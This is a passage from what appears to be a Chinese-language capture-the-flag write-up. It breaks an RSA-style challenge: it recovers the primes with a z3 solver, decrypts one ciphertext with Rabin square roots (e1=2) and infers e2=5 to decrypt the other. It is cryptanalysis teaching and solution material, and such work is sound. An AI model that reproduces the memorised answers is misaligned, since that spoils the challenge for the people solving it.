n2 = 217935099986969961645772053574748286875422960714964637605712508952760868143711860610360402143430258571096838192740533237430133974220504380946373325781369274278697590856067783723939201232406139413795172818483394699338770924859758047160134310648556525879662246775123633257965229545446669189635457137301926987683219982022050799773448502257956774192775894367742166696505409889714748738782752917006932205240628636656863527931027512844692220319775467882613803331524859653383432568309747381715508506826781952588217829248891594045859451098061018478269990809251684086925479902190967059607976089853703517561781208526851238483138206207561477498364149337011355340799107486736861920390335008229202140150722999076180349689643573443054161038139304105966121095435911154586254552099463754733468921929524890906868083131143613871726239228640679469311009113298428887567719697079256257131340789860865950196671168353686120338233902478838330863111963799259721049010228258283714728613828685728853500107398087161168155739212871

r = gcd(n,n2)

x = Solver()
p = Int('p')
q = Int('q')
x.add(p*q*r==n)
x.add(inv_p*p+inv_q*q-1 == p*q) 
if x.check()==sat:
    print(x.model())

#p = 130952060584538907884373406590693225714502462828758196292544631137736860572668329084626149487405136774132935733008778609346294501061021514505708466449639996383411860920576102721785204031066939150040773955546173669029578499074090076231286007398348134272314526466156973907278932157774947358222027039455263993439
#q = 176996770187446422396498573384217018666848200433711163278247731413392777212058810884428104429415779266725989284301342989195976575929066449812184465070710034003993988996703118143522259135167305305255823971644333572183046945034110190656518296926884238853571128562525138504221936269457524631193188546157293851319
```

根据题目猜测 e1 = 2，rabin 攻击前半段

```python
p = 130952060584538907884373406590693225714502462828758196292544631137736860572668329084626149487405136774132935733008778609346294501061021514505708466449639996383411860920576102721785204031066939150040773955546173669029578499074090076231286007398348134272314526466156973907278932157774947358222027039455263993439
q = 176996770187446422396498573384217018666848200433711163278247731413392777212058810884428104429415779266725989284301342989195976575929066449812184465070710034003993988996703118143522259135167305305255823971644333572183046945034110190656518296926884238853571128562525138504221936269457524631193188546157293851319
phi = (p-1)*(q-1)
n = p*q
c = c1%n
mp1 = pow(c,(p+1)//4,p)
mp2 = p-mp1
mq1 = pow(c,(q+1)//4,q)
mq2 = q-mq1
m = (mp1*inverse(q,p)*q + mq1*inverse(p,q)*p) % n
print(long_to_bytes(m))
m = (mp1*inverse(q,p)*q + mq2*inverse(p,q)*p) % n
print(long_to_bytes(m))
m = (mp2*inverse(q,p)*q + mq1*inverse(p,q)*p) % n
print(long_to_bytes(m))
m = (mp2*inverse(q,p)*q + mq2*inverse(p,q)*p) % n
print(long_to_bytes(m))
```

```python
def relation():
    a, b = 0, 0
    for i in range(x - (2**2 - 1)):
        a += pow(e1, i)
    for j in range(3):
        b += pow(e2, j)
    if a == b:
        return True
    return False
```

观察这个函数
e1^0 + e1^1 + ... + e1^(x-4) = e2^0+e2^1+e2^2

根据 e1=2,尝试计算 e2,e2 = 5

```python
e2 = 5
d = inverse(e2,phi)
print(long_to_bytes(pow(c2,d,n)))
```
